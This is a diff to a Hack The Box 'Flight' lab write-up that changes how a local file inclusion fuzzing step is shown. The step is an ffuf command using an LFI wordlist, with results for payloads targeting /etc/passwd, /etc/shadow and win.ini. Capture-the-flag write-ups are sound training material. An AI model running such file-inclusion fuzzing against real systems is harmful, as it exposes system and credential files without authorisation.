@@ -447,18 +447,6 @@ Priority: u=0, i
 
 And now I'll run ffuf.
 
-<div class="terminal">
-
-<span class="cmd">┌──(kali㉿kali)-[~/hackthebox/flight]</span>
-<span class="cmd">└─$ ffuf -request req.req -request-proto http  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ac </span>
-
-<span class="error">%00/etc/passwd%00</span>       [Status: 500]
-<span class="error">etc/shadow%00</span>           [Status: 500]
-
-<span class="success">C:/Windows/win.ini</span>    [Status: 200]
-
-</div>
-
 ```bash
 ┌──(kali㉿kali)-[~/hackthebox/flight]
 └─$ ffuf -request req.req -request-proto http  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ac
@@ -491,11 +479,11 @@ ________________________________________________
  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-%00/etc/shadow%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
-%00/etc/passwd%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
-/etc/passwd%00          [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 34ms]
-etc/shadow%00           [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 41ms]
-C:/Windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 36ms]
+- %00/etc/shadow%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
+- %00/etc/passwd%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
+- /etc/passwd%00          [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 34ms]
+- etc/shadow%00           [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 41ms]
++ C:/Windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 36ms]
 :: Progress: [929/929] :: Job [1/1] :: 925 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
 ```
 
